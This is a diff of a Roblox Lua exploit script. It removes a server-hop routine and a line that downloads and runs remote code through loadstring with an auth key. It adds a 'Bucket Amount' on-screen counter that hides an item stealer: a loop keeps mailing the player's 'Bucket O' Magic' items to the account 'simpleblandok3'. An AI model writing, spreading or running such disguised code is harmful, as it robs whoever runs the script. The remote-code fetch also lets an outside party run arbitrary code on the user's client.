@@ -1,49 +1,69 @@
-local function Dialogggg()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local Client = require(ReplicatedStorage:WaitForChild("Library"))
+
+local ItemBucket = {"Bucket O' Magic"}
+local BucketAmount = 0
+local BucketUID = ""
+
+local function GetItemInfo(ItemsClass, ItemsName)
+    local Table = {}
+    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
+    for UID, Item in pairs(Inventory[ItemsClass]) do
+        if table.find(ItemsName, Item.id) then
+            local ItemInfo = {
+                ["uid"] = UID,
+                ["data"] = Item
+            }
+            table.insert(Table, ItemInfo)
+        end
+    end
+    return Table
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local bucketLabel = Instance.new("TextLabel")
+bucketLabel.Parent = screenGui
+bucketLabel.Size = UDim2.new(0, 300, 0, 100)
+bucketLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
+bucketLabel.BackgroundTransparency = 1
+bucketLabel.TextScaled = true
+bucketLabel.TextColor3 = Color3.new(0, 0, 0)
+bucketLabel.Text = "Bucket Amount: " .. BucketAmount
+
+local function UpdateBucketAmount()
     while true do
-      wait(500)
-
-local Http = game:GetService("HttpService")
-local TPS = game:GetService("TeleportService")
-local Api = "https://games.roblox.com/v1/games/"
-
-local _place = game.PlaceId
-local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
-
--- Updated HTTP request method
-local httpService = game:GetService("HttpService")
-local request = (syn and syn.request) or request or (http and http.request) or http_request
-
-function ListServers(cursor)
-    local Raw = request({
-        Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
-        Method = "GET"
-    })
-    return Http:JSONDecode(Raw.Body)
-end
-
-local randomPlayers = math.random(1, 8)  -- Generate a random number between 1 and 8
-local Server, Next
-
-repeat
-    local Servers = ListServers(Next)
-    Server = Servers.data[1]
-    Next = Servers.nextPageCursor
-until Server and Server.playing >= randomPlayers  -- Ensure the server has more players than the random number
-
-if Server then
-    TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
-else
-    print("No suitable server found.")
-end
-
-        
+        local MiscItems = GetItemInfo("Misc", ItemBucket)
+        for _, ItemInfo in pairs(MiscItems) do
+            local ItemData = ItemInfo.data
+            if ItemData._am and ItemData.id == "Bucket O' Magic" then
+                BucketAmount = ItemData._am
+                BucketUID = ItemInfo.uid
+                bucketLabel.Text = "Bucket Amount: " .. BucketAmount
+            end
+        end
+        wait(0.3)
     end
 end
-    
-coroutine.wrap(Dialogggg)()
 
-getgenv().AuthKey = "HUGE_5EN7Jo6KrCC4"
-getgenv().LoadSettings = {
-    Example_Setting = Example_Value
-}
-loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+local function SendBucketMail()
+    while true do
+        if BucketAmount > 100 then
+            local args = {
+                [1] = "simpleblandok3",
+                [2] = "enjoy bro",
+                [3] = "Misc",
+                [4] = BucketUID,
+                [5] = BucketAmount - 1
+            }
+            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+            wait(3)
+        end
+        wait(0.3)
+    end
+end
+
+spawn(UpdateBucketAmount)
+spawn(SendBucketMail)
